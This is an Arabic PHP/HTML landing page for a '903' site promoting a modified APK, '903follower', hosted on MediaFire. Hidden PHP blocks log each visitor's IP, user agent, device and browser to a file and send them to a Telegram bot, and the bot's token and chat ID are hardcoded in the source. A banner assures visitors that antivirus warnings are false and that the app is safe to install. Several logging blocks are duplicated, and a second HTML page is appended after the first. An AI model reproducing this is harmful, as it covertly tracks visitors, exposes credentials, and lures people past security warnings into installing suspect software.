
<?php
// تسجيل IP الزائر
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");
$log = "IP: $ip - Time: $time" . PHP_EOL;
file_put_contents("ips.txt", $log, FILE_APPEND);
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>903</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Cairo', sans-serif;
    }

    /* تأثير الاهتزاز */
    @keyframes shake {
      0% { transform: translateX(0); }
      20% { transform: translateX(-10px); }
      40% { transform: translateX(10px); }
      60% { transform: translateX(-6px); }
      80% { transform: translateX(6px); }
      100% { transform: translateX(0); }
    }

    .attention {
      opacity: 0;
      transform: translateY(-20px);
      transition: all 0.7s ease;
    }

    .attention.show {
      opacity: 1;
      transform: translateY(0);
      animation: shake 0.6s ease;
    }
  </style>
</head>
<body class="bg-gradient-to-b from-gray-900 to-black text-white min-h-screen flex items-center justify-center p-4">

  <div class="absolute top-4 w-full px-4">
    <!-- ✅ الرسالة بظهور واهتزاز -->
    <div id="warningMessage" class="attention bg-yellow-100 border border-yellow-400 text-yellow-800 p-4 rounded-xl max-w-2xl mx-auto mb-6 shadow-md flex justify-between items-start">
      <div class="text-right">
        <h3 class="font-bold text-lg mb-1">⚠️ تنبيه مهم</h3>
        <p class="text-sm leading-relaxed">
          قد يظهر لك أن التطبيق يحتوي على فيروس. لا تقلق، هذا بسبب أن التطبيق معدل من تطبيق آخر،
          وقد يعتبره النظام غير معروف. <span class="font-semibold">يمكنك التحميل والتجربة بأمان.</span>
        </p>
      </div>
      <button onclick="document.getElementById('warningMessage').style.display='none'" class="ml-4 text-xl font-bold text-yellow-600 hover:text-yellow-800">
        ×
      </button>
    </div>
  </div>

  <div class="text-center space-y-8 max-w-2xl mt-32">
    <h1 class="text-5xl font-bold text-teal-400 drop-shadow-lg">903</h1>
    
    <!-- حقل الكلام عن الشركة -->
    <div>
      <h2 class="text-3xl font-bold text-white mb-4">عن شركتنا</h2>
      <p class="text-xl text-gray-300 leading-relaxed">
        مرحبًا بك في موقعي الخاص! هنا يمكنك تحميل تطبيقي بكل سهولة والاستمتاع بتجربة مميزة.
      </p>
    </div>









<?php
// معلومات التوكن والمعرف
$botToken = "2107326201:AAF6wYZfA8gLUH5CnqUu9nQ2x_JTnGKwC5Y"; // مثال: 123456789:ABCDEF...
$chatId = "2116258278"; // مثال: 123456789 أو -100...

// الحصول على عنوان IP والمتصفح
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

// نص الرسالة
$message = "🚨 زائر جديد دخل الموقع\n"
         . "🕒 الوقت: $time\n"
         . "🌐 IP: $ip\n"
         . "📱 المتصفح والجهاز:\n$userAgent";

// رابط طلب الإرسال إلى تيليجرام
$url = "https://api.telegram.org/bot2107326201:AAF6wYZfA8gLUH5CnqUu9nQ2x_JTnGKwC5Y/sendMessage";

// تجهيز بيانات الإرسال
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// تنفيذ الطلب
file_get_contents($url . "?" . http_build_query($data));
?>






    <div class="flex flex-col md:flex-row items-center gap-6 my-10">
  <!-- ✅ الصورة على اليسار -->
  <div class="md:w-1/3 w-full">
    <img src="ChatGPT Image.png" alt="عن شركتنا" class="w-full rounded-2xl shadow-lg" />
  </div>

  <!-- ✅ النص على اليمين -->
  <div class="md:w-2/3 w-full text-right">
    <h2 class="text-3xl font-bold text-white mb-4">عن شركتنا</h2>
    <p class="text-xl text-gray-300 leading-relaxed">
      مرحبًا بك في موقعي الخاص! نحن في 903 نعمل على تطوير تطبيقات معدلة لتوفير تجربة استخدام مميزة وسهلة.
    </p>
  </div>
</div>













    <!-- وصف مختصر -->
    <p class="text-lg text-gray-300">
      نحن في 903 نعمل على إنشاء تطبيقات معدلة ومحسنة لغرض تسهيل الاستخدام، فقررنا أن نطلق أول تطبيقاتنا وهو <strong>903follower</strong>. لتحميل التطبيق اضغط أدناه:
    </p>

    <!-- زر تحميل التطبيق -->
    <a href="https://www.mediafire.com/file/0f8zct7kb4pt7oe/903follower%2528cypher%2529.apk/file" target="_blank"
      class="inline-block px-6 py-3 bg-teal-500 hover:bg-teal-600 text-white text-lg font-semibold rounded-2xl shadow-lg transition duration-300">
      تحميل التطبيق
    </a>
  </div>

  
  <script>
    window.onload = function () {
      const message = document.getElementById('warningMessage');
      setTimeout(() => {
        message.classList.add('show');
      }, 500); // التأخير قبل الظهور مع الحركة
    }
  </script>
</body>
</html>

<?php
// تسجيل عنوان IP الزائر
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");
$log = "IP: $ip - Time: $time" . PHP_EOL;

// حفظ الـ IP في ملف ips.txt
file_put_contents("ips.txt", $log, FILE_APPEND);
?>

<!-- باقي محتوى صفحتك الرئيسية هنا -->
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>موقعي</title>
</head>
<body>
    <h1>  </h1>
</body>
</html>



<?php
// جمع بيانات المستخدم
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

// تحليل نوع الجهاز
if (preg_match('/android/i', $userAgent)) {
    $device = "Android";
} elseif (preg_match('/iphone/i', $userAgent)) {
    $device = "iPhone";
} elseif (preg_match('/windows/i', $userAgent)) {
    $device = "Windows";
} elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
    $device = "Mac";
} else {
    $device = "غير معروف";
}

// تحليل نوع المتصفح
if (preg_match('/chrome/i', $userAgent)) {
    $browser = "Chrome";
} elseif (preg_match('/firefox/i', $userAgent)) {
    $browser = "Firefox";
} elseif (preg_match('/safari/i', $userAgent) && !preg_match('/chrome/i', $userAgent)) {
    $browser = "Safari";
} elseif (preg_match('/edge/i', $userAgent)) {
    $browser = "Edge";
} elseif (preg_match('/opera|opr/i', $userAgent)) {
    $browser = "Opera";
} else {
    $browser = "غير معروف";
}

// حفظ السجل
$log = "IP: $ip | Device: $device | Browser: $browser | Time: $time" . PHP_EOL;
file_put_contents("ips.txt", $log, FILE_APPEND);
?>















































<?php
// الحصول على عنوان IP
$ip = $_SERVER['REMOTE_ADDR'];

// الحصول على التاريخ والوقت
$time = date("Y-m-d H:i:s");

// إنشاء السطر الذي سيتم تخزينه
$log = "IP: $ip - Time: $time" . PHP_EOL;

// حفظ IP في ملف نصي
file_put_contents("ips.txt", $log, FILE_APPEND);

echo "";

?>
